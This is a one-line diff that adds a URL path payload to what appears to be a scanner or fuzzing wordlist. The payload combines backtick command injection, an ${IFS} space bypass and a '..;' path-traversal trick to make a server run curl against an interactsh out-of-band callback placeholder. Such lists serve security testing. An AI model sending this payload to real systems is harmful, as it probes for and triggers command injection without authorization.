@@ -1,0 +1,1 @@
+/misc/`curl${IFS}{{interactsh-url}}`/..;/index.html
